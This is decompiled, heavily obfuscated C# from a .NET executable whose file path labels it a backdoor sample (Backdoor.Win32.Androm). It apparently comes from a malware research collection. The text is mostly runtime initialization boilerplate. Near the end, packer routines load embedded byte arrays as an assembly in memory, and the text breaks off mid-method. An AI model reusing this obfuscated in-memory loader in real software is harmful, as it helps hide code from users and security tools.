// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WindowsApplication9, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C73BAE-42C9-44D7-8457-F03085D10BAA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Backdoor.Win32.Androm.jxcj-48341195844485f7c4463d03d00891a4051821747b54bea401bb1b34fadecd65.exe

using \u0082\u009A;
using à;
using ó;
using PvLogiciels.dotNetProtector;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0082\u009A
{
  internal class \u0082\u0099
  {
    internal static Á \u0081\u00AD;
    [FixedAddressValueType]
    internal static int \u0081\u00A8;
    internal static __FnPtr<void ()> \u0081\u009C;
    internal static Á \u0081\u0086;
    [FixedAddressValueType]
    internal static \u00B0.\u00AE \u0024;
    internal static __FnPtr<void ()> é;
    [FixedAddressValueType]
    internal static bool Ï;
    internal static __FnPtr<void ()> \u00BC;
    internal static Á \u00A1;
    [FixedAddressValueType]
    internal static \u00B0.\u00AE \u009B;
    internal static __FnPtr<void ()> \u0082;
    [FixedAddressValueType]
    internal static int \u0081\u0024;
    internal static __FnPtr<void ()> \u0081ë;
    internal static Á \u0081\u0096;
    [FixedAddressValueType]
    internal static \u00B0.\u00AE \u0081Î;
    internal static __FnPtr<void ()> \u0081\u00BD;
    internal static Á \u0081\u00A6;
    [FixedAddressValueType]
    internal static \u00B0.\u00AE \u0081\u00A3;
    internal static __FnPtr<void ()> \u0081\u008F;
    internal static bool ô;
    internal static bool á;
    internal static bool Õ;
    internal static int Â;
    internal static uint \u00B4;
    internal static uint \u00A5;
    internal static \u0096.\u00AE \u0081Ù;
    internal static uint \u0082\u0097;
    internal static uint \u0082\u0088;
    internal static uint \u0081õ;
    internal static \u0096.\u00AE \u0081\u00A1;
    internal static bool \u0081Õ;
    internal static Á \u0081Ã;
    public static unsafe int** \u0081À;
    public static unsafe int** \u0081\u00AE;
    internal static __FnPtr<int ()> \u0081\u009B;
    [FixedAddressValueType]
    internal static uint \u0081\u0095;
    [FixedAddressValueType]
    internal static \u0081ø \u00BB;
    internal static __FnPtr<void ()> ù;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* ä;
    internal static uint Ý;
    internal static unsafe __FnPtr<void ()>* Ø;
    internal static unsafe __FnPtr<void ()>* Ò;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* Ë;
    internal static int \u0081ü;
    internal static int À;
    internal static int \u00BD;
    internal static int \u00B9;
    internal static int \u00B1;
    internal static int \u00AF;
    internal static int \u00AD;
    public static \u00AC \u009A;
    public static volatile uint \u0097;
    public static \u00AC \u0091;
    public static \u00A2 \u008E;
    public static volatile \u0094 \u008C;
    public static \u00A2 \u0084;
    public static unsafe void* \u0081;
    public static volatile uint \u0082\u0094;
    public static unsafe __FnPtr<void ()>* \u0082\u008F;
    public static unsafe __FnPtr<void ()>* \u0082\u008A;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u0089() => \u0082\u0099.\u0082\u0094 != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool ü() => \u0082\u0099.\u0082\u0094 == 1U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool ð() => \u0082\u0099.\u0082\u0094 == 0U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool ß() => \u0082\u0099.\u0097 != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool Ô() => (\u0082\u0099.\u0082\u0094 != uint.MaxValue ? 1 : 0) == 0 || (\u0082\u0099.\u0097 != uint.MaxValue ? 1 : 0) != 0 || \u0082\u0099.\u0082\u0094 != 1U && \u0082\u0099.\u0082\u0094 != 0U;

    internal static unsafe int Ä(void* _param0)
    {
      GC.KeepAlive((object) int.MaxValue);
      return 0;
    }

    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u00B2()
    {
      if (\u0082\u0099.\u0081\u00A1 != (\u0096.\u00AE) 2)
        return \u0082\u0099.\u0081\u00A1 == (\u0096.\u00AE) -1;
      void** voidPtr = (void**) &\u0082\u0099.\u0081Ã;
      if (ref \u0082\u0099.\u0081Ã < ref \u0082\u0099.\u0081\u00AD)
      {
        while (*(int*) voidPtr == 0)
        {
          voidPtr += 4;
          if ((IntPtr) voidPtr >= ref \u0082\u0099.\u0081\u00AD)
            goto label_5;
        }
        \u0082\u0099.\u0081\u00A1 = (\u0096.\u00AE) -1;
        return true;
      }
label_5:
      \u0082\u0099.\u0081\u00A1 = (\u0096.\u00AE) 0;
      return false;
    }

    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u00A4()
    {
      if (\u0082\u0099.\u0081Ù != (\u0096.\u00AE) 2)
        return \u0082\u0099.\u0081Ù == (\u0096.\u00AE) -1;
      void** voidPtr1 = (void**) &\u0082\u0099.\u008E;
      if (ref \u0082\u0099.\u008E < ref \u0082\u0099.\u0084)
      {
        while (*(int*) voidPtr1 == 0)
        {
          voidPtr1 += 4;
          if ((IntPtr) voidPtr1 >= ref \u0082\u0099.\u0084)
            goto label_5;
        }
        \u0082\u0099.\u0081Ù = (\u0096.\u00AE) -1;
        return true;
      }
label_5:
      void** voidPtr2 = (void**) &\u0082\u0099.\u0091;
      if (ref \u0082\u0099.\u0091 < ref \u0082\u0099.\u009A)
      {
        while (*(int*) voidPtr2 == 0)
        {
          voidPtr2 += 4;
          if ((IntPtr) voidPtr2 >= ref \u0082\u0099.\u009A)
            goto label_9;
        }
        \u0082\u0099.\u0081Ù = (\u0096.\u00AE) -1;
        return true;
      }
label_9:
      \u0082\u0099.\u0081Ù = (\u0096.\u00AE) 0;
      return false;
    }

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0099() => \u0082\u0099.\u00B2() && !\u0082\u0099.ô || \u0082\u0099.\u00A4() && !\u0082\u0099.Õ && \u0082\u0099.\u008C == (\u0094) 0;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0085() => \u0082\u0099.á;

    internal static unsafe void \u0081\u00BB() => \u0082\u0099.\u0081ª((__FnPtr<int (void*)>) (IntPtr) \u0082\u0099.\u0081À, (void*) 0);

    internal static void \u0081ý() => \u0082\u0099.\u0081\u0024 = 0;

    internal static void \u0081ã() => \u0082\u0099.\u0081\u00A8 = 0;

    internal static void \u0081Í() => \u0082\u0099.Ï = false;

    internal static void \u0081\u00B9() => \u0082\u0099.\u0081Î = (\u00B0.\u00AE) 0;

    internal static void \u0081\u00A4() => \u0082\u0099.\u009B = (\u00B0.\u00AE) 0;

    internal static void ë() => \u0082\u0099.\u0081\u00A3 = (\u00B0.\u00AE) 0;

    internal static void î() => \u0082\u0099.\u0024 = (\u00B0.\u00AE) 0;

    [DebuggerStepThrough]
    internal static unsafe void \u0086([In] Ó* obj0)
    {
      \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load during vtable initialization.\n");
      \u0082\u0099.\u0081Î = (\u00B0.\u00AE) 1;
      \u0082\u0099.Ê((__FnPtr<void* ()>*) &\u0082\u0099.\u0081\u0086, (__FnPtr<void* ()>*) &\u0082\u0099.\u0081\u00A6);
      \u0082\u0099.\u0081Î = (\u00B0.\u00AE) 2;
    }

    internal static unsafe void \u00BE([In] Ó* obj0)
    {
      \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load while attempting to initialize the default appdomain.\n");
      \u0082\u0099.\u0081\u00BB();
    }

    [DebuggerStepThrough]
    internal static unsafe void \u00A9([In] Ó* obj0)
    {
      \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load during native initialization.\n");
      \u0082\u0099.\u0081ä();
      \u0082\u0099.Õ = true;
      if (!\u0082\u0099.Ô())
        \u0082\u0099.\u0081è(33);
      switch (\u0082\u0099.\u008C)
      {
        case (\u0094) 0:
          \u0082\u0099.\u009B = (\u00B0.\u00AE) 1;
          \u0082\u0099.\u008C = (\u0094) 1;
          if (\u0082\u0099.Ü((__FnPtr<int ()>*) &\u0082\u0099.\u008E, (__FnPtr<int ()>*) &\u0082\u0099.\u0084) != 0)
            \u0082\u0099.\u0081Ý(\u0082\u0099.Þ((Ð*) obj0));
          \u0082\u0099.\u00D7((__FnPtr<void ()>*) &\u0082\u0099.\u0091, (__FnPtr<void ()>*) &\u0082\u0099.\u009A);
          \u0082\u0099.\u008C = (\u0094) 2;
          \u0082\u0099.\u0081Õ = true;
          \u0082\u0099.\u009B = (\u00B0.\u00AE) 2;
          break;
        case (\u0094) 1:
          \u0082\u0099.\u0081è(33);
          break;
      }
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u008D([In] Ó* obj0)
    {
      \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load during process initialization.\n");
      \u0082\u0099.\u0081\u00A3 = (\u00B0.\u00AE) 1;
      \u0082\u0099.\u0081Á();
      \u0082\u0099.Ê((__FnPtr<void* ()>*) &\u0082\u0099.\u0081Ã, (__FnPtr<void* ()>*) &\u0082\u0099.\u0081\u00AD);
      \u0082\u0099.\u0081\u00A3 = (\u00B0.\u00AE) 2;
      \u0082\u0099.ô = true;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0089([In] Ó* obj0)
    {
      \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load during appdomain initialization.\n");
      \u0082\u0099.\u0024 = (\u00B0.\u00AE) 1;
      \u0082\u0099.\u0081µ();
      \u0082\u0099.Ê((__FnPtr<void* ()>*) &\u0082\u0099.\u00A1, (__FnPtr<void* ()>*) &\u0082\u0099.\u0081\u0096);
      \u0082\u0099.\u0024 = (\u00B0.\u00AE) 2;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u0090([In] Ó* obj0)
    {
      \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load during registration for the unload events.\n");
      \u0082\u0099.\u0081\u00B7(new EventHandler(\u0082\u0099.\u0081º));
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DebuggerStepThrough]
    internal static unsafe void \u0081ù([In] Ó* obj0)
    {
      \u0082\u0099.Ï = AppDomain.CurrentDomain.IsDefaultAppDomain();
      if (\u0082\u0099.Ï)
        \u0082\u0099.á = true;
      \u0082\u0099.\u0081Ñ();
      void* voidPtr1 = \u0082\u0099.\u0081ì();
      int num1 = 0;
      int num2 = 0;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        while (num2 == 0)
        {
          try
          {
          }
          finally
          {
            IntPtr comparand = (IntPtr) 0;
            IntPtr num3 = (IntPtr) voidPtr1;
            // ISSUE: cast to a reference type
            void* voidPtr2 = (void*) Interlocked.CompareExchange((IntPtr&) ref \u0082\u0099.\u0081, num3, comparand);
            if ((IntPtr) voidPtr2 == IntPtr.Zero)
              num2 = 1;
            else if (voidPtr2 == voidPtr1)
            {
              num1 = 1;
              num2 = 1;
            }
          }
          if (num2 == 0)
            \u0082\u0099.\u0081\u00AF(1000U);
        }
        if (!\u0082\u0099.Ï)
        {
          if (\u0082\u0099.\u0099())
            \u0082\u0099.\u00BE(obj0);
        }
      }
      finally
      {
        if (num1 == 0)
        {
          IntPtr num4 = (IntPtr) 0;
          // ISSUE: cast to a reference type
          Interlocked.Exchange((IntPtr&) ref \u0082\u0099.\u0081, num4);
        }
      }
      \u0082\u0099.\u0086(obj0);
      if (\u0082\u0099.Ï)
      {
        \u0082\u0099.\u00A9(obj0);
        \u0082\u0099.\u0082\u008D(obj0);
      }
      \u0082\u0099.\u0089(obj0);
      \u0082\u0099.\u0081\u0024 = 1;
      \u0082\u0099.\u0082\u0090(obj0);
    }

    internal static void \u0081é() => \u0082\u0099.\u0081\u00B1();

    internal static unsafe int \u0081\u009A(void* _param0)
    {
      \u0082\u0099.\u0081Ä();
      \u0082\u0099.ô = false;
      if (\u0082\u0099.\u0081Õ)
      {
        \u0082\u0099.\u0081\u00A2();
        \u0082\u0099.\u008C = (\u0094) 0;
        \u0082\u0099.\u0081Õ = false;
      }
      \u0082\u0099.Õ = false;
      return 0;
    }

    internal static unsafe void \u0081É()
    {
      if (!\u0082\u0099.á)
        return;
      if (AppDomain.CurrentDomain.IsDefaultAppDomain())
      {
        \u0082\u0099.\u0081\u009A((void*) 0);
      }
      else
      {
        // ISSUE: cast to a function pointer type
        \u0082\u0099.\u0081ª((__FnPtr<int (void*)>) (IntPtr) \u0082\u0099.\u0081\u00AE, (void*) 0);
      }
    }

    [PrePrepareMethod]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static void \u0081º(object _param0, EventArgs _param1)
    {
      if (\u0082\u0099.\u0081\u0024 == 0 || Interlocked.Exchange(ref \u0082\u0099.\u0081\u00A8, 1) != 0)
        return;
      int num = Interlocked.Decrement(ref \u0082\u0099.Â) == 0 ? 1 : 0;
      \u0082\u0099.\u0081\u00B1();
      if ((byte) num == (byte) 0)
        return;
      \u0082\u0099.\u0081É();
    }

    [DebuggerStepThrough]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void \u0081\u00A9([In] Ó* obj0, Exception _param1)
    {
      try
      {
        bool flag = Interlocked.Decrement(ref \u0082\u0099.Â) == 0;
        \u0082\u0099.\u0081é();
        if (!flag)
          return;
        \u0082\u0099.\u0081É();
      }
      catch (Exception ex)
      {
        \u0082\u0099.\u0081Å(_param1, ex);
      }
      catch
      {
        \u0082\u0099.\u0081Å(_param1, (Exception) null);
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DebuggerStepThrough]
    internal static unsafe void \u0081\u009E([In] Ó* obj0)
    {
      bool flag = false;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        \u0082\u0099.æ((Ð*) obj0, "The C++ module failed to load.\n");
        RuntimeHelpers.PrepareConstrainedRegions();
        try
        {
        }
        finally
        {
          Interlocked.Increment(ref \u0082\u0099.Â);
          flag = true;
        }
        \u0082\u0099.\u0081ù(obj0);
      }
      catch (Exception ex)
      {
        if (flag)
          \u0082\u0099.\u0081\u00A9(obj0, ex);
        \u0082\u0099.\u0081Ý(\u0082\u0099.Þ((Ð*) obj0), ex);
      }
      catch
      {
        if (flag)
          \u0082\u0099.\u0081\u00A9(obj0, (Exception) null);
        \u0082\u0099.\u0081Ý(\u0082\u0099.Þ((Ð*) obj0), (Exception) null);
      }
    }

    [DebuggerStepThrough]
    static unsafe \u0082\u0099()
    {
      Ó ó;
      \u0082\u0099.è(&ó);
      // ISSUE: fault handler
      try
      {
        \u0082\u0099.\u0081\u009E(&ó);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u0082\u0099.ª((__FnPtr<void (void*)>) __methodptr(\u0081\u0082), (void*) &ó);
      }
      \u0082\u0099.ñ((Ð*) &ó);
    }

    internal static unsafe Ó* è([In] Ó* obj0)
    {
      \u0082\u0099.ö((Ð*) obj0);
      return obj0;
    }

    internal static unsafe void \u0081\u0082([In] Ó* obj0) => \u0082\u0099.ñ((Ð*) obj0);

    [DebuggerStepThrough]
    internal static unsafe Ð* ö([In] Ð* obj0)
    {
      IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
      *(int*) obj0 = (int) num.ToPointer();
      return obj0;
    }

    [DebuggerStepThrough]
    internal static unsafe void ñ([In] Ð* obj0)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
      *(int*) obj0 = 0;
    }

    [DebuggerStepThrough]
    internal static unsafe Ð* æ([In] Ð* obj0, string _param1)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) _param1;
      return obj0;
    }

    internal static unsafe string Þ([In] Ð* obj0) => (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;

    [STAThread]
    internal static unsafe int \u00A6(string[] _param0)
    {
      try
      {
        \u0082\u0099.\u0081\u0099(1);
        *\u0082\u0099.\u0081\u0087() = \u0082\u0099.\u00AF;
        *\u0082\u0099.\u0081\u008E() = \u0082\u0099.\u00B1;
        \u0082\u0099.\u008B();
        \u0082\u0099.\u0090();
        if (\u0082\u0099.\u00BD == -1)
          \u0082\u0099.\u0081\u0094(-1);
        \u0082\u0098 obj;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref obj = \u0082\u0099.À;
        int num;
        char** chPtr1;
        char** chPtr2;
        if (\u0082\u0099.\u0081\u0084(&num, &chPtr1, &chPtr2, \u0082\u0099.\u0081ü, &obj) < 0)
          \u0082\u0099.\u0081è(8);
        \u0082\u0099.Í();
        return \u0082\u0099.\u0081ö(_param0);
      }
      catch (Exception ex) when (\u0082\u0099.\u0081\u008C((uint) Marshal.GetExceptionCode(), (\u0087*) Marshal.GetExceptionPointers()) != 0)
      {
        return Marshal.GetExceptionCode();
      }
    }

    internal static unsafe void Í()
    {
      \u0081û* ûPtr = (\u0081û*) \u0082\u0099.\u0081\u0092((sbyte*) 0);
      if (*(ushort*) ûPtr != (ushort) 23117)
        return;
      \u0082\u0089* objPtr = (\u0082\u0089*) (*(int*) ((IntPtr) ûPtr + 60) + (IntPtr) ûPtr);
      if (*(int*) objPtr != 17744 || *(ushort*) ((IntPtr) objPtr + 24) != (ushort) 267)
        return;
      if (*(ushort*) ((IntPtr) objPtr + 24 + 68) != (ushort) 3)
        \u0082\u0099.\u0081\u0099(2);
      else
        \u0082\u0099.\u0081\u0099(1);
    }

    [DebuggerStepThrough]
    internal static unsafe void Ã()
    {
      object obj = new object();
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref \u0082\u0099.\u00BB = 0;
      \u0082\u0099.ì(&\u0082\u0099.\u00BB, obj);
    }

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u00B6() => \u0082\u0099.ç(&\u0082\u0099.\u00BB) != null;

    [DebuggerStepThrough]
    internal static unsafe void \u00A8() => Monitor.Enter(\u0082\u0099.ç(&\u0082\u0099.\u00BB));

    [DebuggerStepThrough]
    internal static unsafe void \u009C() => Monitor.Exit(\u0082\u0099.ç(&\u0082\u0099.\u00BB));

    internal static void \u0092() => \u0082\u0099.þ((__FnPtr<void ()>) __methodptr(\u0082\u0087));

    internal static unsafe void \u0082\u0087() => \u0082\u0099.\u0081\u008B(&\u0082\u0099.\u00BB);

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0081\u0098()
    {
      bool flag = false;
      if (\u0082\u0099.\u00B6())
      {
        Monitor.Enter(\u0082\u0099.ç(&\u0082\u0099.\u00BB));
        flag = true;
      }
      return flag;
    }

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0081á()
    {
      bool flag = false;
      if (\u0082\u0099.\u00B6())
      {
        Monitor.Exit(\u0082\u0099.ç(&\u0082\u0099.\u00BB));
        flag = true;
      }
      return flag;
    }

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081Ü()
    {
      if (!\u0082\u0099.\u00B6())
        \u0082\u0099.Ã();
      return \u0082\u0099.\u00B6();
    }

    internal static unsafe int \u0081Ò(
      __FnPtr<void ()> _param0,
      uint* _param1,
      __FnPtr<void ()>** _param2,
      __FnPtr<void ()>** _param3)
    {
      // ISSUE: cast to a function pointer type
      __FnPtr<void ()> local1 = (__FnPtr<void ()>) 0;
      if (_param0 == null)
        return -1;
      int num1;
      if (\u0082\u0099.\u0081\u0098())
      {
        try
        {
          if (*_param1 - 1U < (uint) (*(int*) _param2 - *(int*) _param3) >> 2)
          {
            try
            {
              uint num2 = *_param1 * 4U;
              uint num3 = num2 >= 2048U ? 2048U : num2;
              IntPtr cb = new IntPtr((int) num2 + (int) num3);
              IntPtr num4 = Marshal.ReAllocHGlobal(new IntPtr((void*) *(int*) _param3), cb);
              __FnPtr<void ()>** local2 = _param2;
              IntPtr num5 = *(int*) local2 + ((IntPtr) num4.ToPointer() - *(int*) _param3);
              *(int*) local2 = (int) num5;
              *(int*) _param3 = (int) num4.ToPointer();
              uint num6 = *_param1;
              uint num7 = 512U >= num6 ? num6 : 512U;
              *_param1 = num6 + num7;
            }
            catch (OutOfMemoryException ex)
            {
              IntPtr cb = new IntPtr((int) *_param1 * 4 + 8);
              IntPtr num8 = Marshal.ReAllocHGlobal(new IntPtr((void*) *(int*) _param3), cb);
              __FnPtr<void ()>** local3 = _param2;
              IntPtr num9 = *(int*) local3 + ((IntPtr) num8.ToPointer() - *(int*) _param3);
              *(int*) local3 = (int) num9;
              *(int*) _param3 = (int) num8.ToPointer();
              uint* numPtr = _param1;
              int num10 = (int) *numPtr + 4;
              *numPtr = (uint) num10;
            }
          }
          *(int*) *(int*) _param2 = (int) _param0;
          __FnPtr<void ()>** local4 = _param2;
          int num11 = *(int*) local4 + 4;
          *(int*) local4 = num11;
          local1 = _param0;
        }
        catch (OutOfMemoryException ex)
        {
        }
        finally
        {
          \u0082\u0099.\u0081á();
        }
        if (local1 != null)
        {
          num1 = 0;
          goto label_12;
        }
      }
      num1 = -1;
label_12:
      return num1;
    }

    internal static unsafe void \u0081Ä()
    {
      if ((IntPtr) \u0082\u0099.Ò == new IntPtr(-1) || (IntPtr) \u0082\u0099.Ò == IntPtr.Zero || (IntPtr) \u0082\u0099.Ø == IntPtr.Zero)
        return;
      \u0082\u0099.Ø -= 4;
      if (\u0082\u0099.Ø >= \u0082\u0099.Ò)
      {
        do
        {
          if (*(int*) \u0082\u0099.Ø != 0)
          {
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            __calli((__FnPtr<void ()>) *(int*) \u0082\u0099.Ø)();
          }
          \u0082\u0099.Ø -= 4;
        }
        while (\u0082\u0099.Ø >= \u0082\u0099.Ò);
      }
      Marshal.FreeHGlobal(new IntPtr((void*) \u0082\u0099.Ò));
    }

    [DebuggerStepThrough]
    internal static unsafe int \u0081Á()
    {
      if (!\u0082\u0099.\u0081Ü())
        return 0;
      \u0082\u0099.Ò = (__FnPtr<void ()>*) Marshal.AllocHGlobal(128).ToPointer();
      \u0082\u0099.Ø = \u0082\u0099.Ò;
      \u0082\u0099.Ý = 32U;
      return 1;
    }

    internal static __FnPtr<int ()> \u0081\u00BF(__FnPtr<int ()> _param0) => \u0082\u0099.\u0081\u0091((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    internal static unsafe int \u0081\u0091(__FnPtr<void ()> _param0) => \u0082\u0099.\u0081Ò(_param0, &\u0082\u0099.Ý, &\u0082\u0099.Ø, &\u0082\u0099.Ò);

    [DebuggerStepThrough]
    internal static unsafe int \u0081µ()
    {
      if (\u0082\u0099.\u0081Ü())
      {
        \u0082\u0099.ä = (__FnPtr<void ()>*) Marshal.AllocHGlobal(128).ToPointer();
        \u0082\u0099.Ë = \u0082\u0099.ä;
        \u0082\u0099.\u0081\u0095 = 32U;
      }
      return 1;
    }

    internal static unsafe void \u0081\u00B1()
    {
      if ((IntPtr) \u0082\u0099.ä == new IntPtr(-1) || (IntPtr) \u0082\u0099.ä == IntPtr.Zero)
        return;
      if ((IntPtr) \u0082\u0099.Ë == IntPtr.Zero)
        return;
      try
      {
        while (true)
        {
          do
          {
            \u0082\u0099.Ë -= 4;
            if (\u0082\u0099.Ë < \u0082\u0099.ä)
              goto label_8;
          }
          while (*(int*) \u0082\u0099.Ë == 0);
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) *(int*) \u0082\u0099.Ë)();
        }
label_8:;
      }
      finally
      {
        Marshal.FreeHGlobal(new IntPtr((void*) \u0082\u0099.ä));
      }
    }

    internal static __FnPtr<int ()> \u0081\u00AB(__FnPtr<int ()> _param0) => \u0082\u0099.þ((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    [DebuggerStepThrough]
    internal static unsafe int þ(__FnPtr<void ()> _param0) => \u0082\u0099.\u0081Ò(_param0, &\u0082\u0099.\u0081\u0095, &\u0082\u0099.Ë, &\u0082\u0099.ä);

    [DebuggerStepThrough]
    internal static unsafe void ø([In] \u0081ø* obj0, object _param1)
    {
      *(int*) obj0 = 0;
      \u0082\u0099.ì(obj0, _param1);
    }

    [DebuggerStepThrough]
    internal static unsafe object ç([In] \u0081ø* obj0)
    {
      ValueType valueType = \u0082\u0099.ú(obj0);
      return valueType != null ? ((GCHandle) valueType).Target : (object) null;
    }

    internal static unsafe void \u0081\u008B([In] \u0081ø* obj0)
    {
      ValueType valueType = \u0082\u0099.ú(obj0);
      if (valueType == null)
        return;
      ((GCHandle) valueType).Free();
      *(int*) obj0 = 0;
    }

    [DebuggerStepThrough]
    internal static unsafe ValueType ú([In] \u0081ø* obj0)
    {
      uint num = (uint) *(int*) obj0;
      return num != 0U ? (ValueType) GCHandle.FromIntPtr(new IntPtr((void*) num)) : (ValueType) null;
    }

    [DebuggerStepThrough]
    internal static unsafe void ì([In] \u0081ø* obj0, object _param1)
    {
      ValueType valueType = \u0082\u0099.ú(obj0);
      if (valueType == null)
      {
        IntPtr intPtr = GCHandle.ToIntPtr(GCHandle.Alloc(_param1));
        *(int*) obj0 = (int) intPtr.ToPointer();
      }
      else
        ((GCHandle) valueType).Target = _param1;
    }

    [DebuggerStepThrough]
    internal static unsafe int Ü(__FnPtr<int ()>* _param0, __FnPtr<int ()>* _param1)
    {
      int num1 = 0;
      if (_param0 < _param1)
      {
        while (num1 == 0)
        {
          uint num2 = (uint) *(int*) _param0;
          if (num2 != 0U)
          {
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            num1 = __calli((__FnPtr<int ()>) (int) num2)();
          }
          _param0 += 4;
          if (_param0 >= _param1)
            break;
        }
      }
      return num1;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u00D7(__FnPtr<void ()>* _param0, __FnPtr<void ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) (int) num)();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    internal static ModuleHandle \u009F() => typeof (\u0081ð).Module.ModuleHandle;

    [DebuggerStepThrough]
    internal static unsafe void Ê(__FnPtr<void* ()>* _param0, __FnPtr<void* ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          void* voidPtr = __calli(\u0082\u0099.Æ((__FnPtr<void* ()>) (int) num))();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    internal static unsafe __FnPtr<void* ()> Æ(__FnPtr<void* ()> _param0) => (__FnPtr<void* ()>) (IntPtr) \u0082\u0099.\u009F().ResolveMethodHandle((int) _param0).GetFunctionPointer().ToPointer();

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void ª(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0082\u0099.\u0081\u0080((\u0087*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void \u00A3(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0082\u0099.\u0081\u0080((\u0087*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void \u009D(
      __FnPtr<void (void*, uint, int, __FnPtr<void (void*)>)> _param0,
      void* _param1,
      uint _param2,
      int _param3,
      __FnPtr<void (void*)> _param4)
    {
      try
      {
        void* voidPtr = _param1;
        int num1 = (int) _param2;
        int num2 = _param3;
        __FnPtr<void (void*)> local = _param4;
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli(_param0)((__FnPtr<void (void*)>) (IntPtr) voidPtr, num1, (uint) num2, (void*) local);
      }
      catch (Exception ex) when (\u0082\u0099.\u0081\u0080((\u0087*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    internal static void \u0090()
    {
      if (\u0082\u0099.\u00B9 != 0)
        return;
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u0082\u0099.û((__FnPtr<int (\u0081Ø*)>) __methodptr(\u0088));
    }

    internal static int \u008B() => 0;

    internal static unsafe int \u0088(\u0081Ø* _param0) => 0;

    internal static unsafe void* \u0081à(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      Module module = Assembly.GetExecutingAssembly().LoadModule("embedded.netmodule", numArray);
      AppDomain.CurrentDomain.SetData("PvLogiciels.dotNetProtector.embedded.netmodule", (object) module);
      return Marshal.GetHINSTANCE(module).ToPointer();
    }

    internal static unsafe void* \u0082\u0092(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      return Marshal.GetHINSTANCE(Assembly.Load(numArray).GetLoadedModules()[0]).ToPointer();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0082\u008C(string[] _param0) => \u003CdotNetProtector\u003E.Main(_param0);

    internal static int \u0082\u0086(string[] _param0)
    {
